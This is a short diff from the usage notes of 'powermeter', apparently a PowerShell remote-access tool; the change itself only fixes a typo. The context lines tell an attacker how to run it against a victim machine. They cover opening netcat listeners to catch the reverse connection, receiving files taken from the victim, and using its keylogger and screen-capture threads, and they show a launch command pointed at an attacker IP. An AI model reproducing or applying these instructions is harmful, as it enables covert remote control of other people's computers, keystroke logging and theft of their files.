@@ -11,7 +11,7 @@ To run this program you need to solve execution-policy problem on your system.
 	
 	#Start powermeter.
 	#When this command is invoked, powermeter will establish a TCP connection to $SHOST:$SPORT (in this case 192.168.214.1:9190). After that, powermeter remote user interface will be ready to take commands and attacker will be able to use powermeter via this tcp connection.
-	#$SPORT should be opened in at $SHOST machine (in other words, attacker machine).'nc -lvp <SPORT>' command can do the trick. The main connection between powermeter and attacker will be established via this port. Attacker send commands to powermeter from this port. 
+	#$SPORT should be opened at $SHOST machine (in other words, attacker machine).'nc -lvp <SPORT>' command can do the trick. The main connection between powermeter and attacker will be established via this port. Attacker send commands to powermeter from this port. 
 	#$FLPORT will be used for any job which requires file transfer (those are download,upload,screencap and keylogger threads). For example, if you want to download a from victim machine, you need to provide a listener $FLPORT at $SHOST machine like this: 'nc -lvp <FLPORT> > downloadedFile'. After that you can call the download function from powermeter shell like this: 'download C:\Users\decoder\Desktop\cozbeni.zip'
 	>> PS C:\Users\decoder\Desktop> Start-Powermeter -SHOST 192.168.214.1 -SPORT 9190 -FLPORT 9192
 	
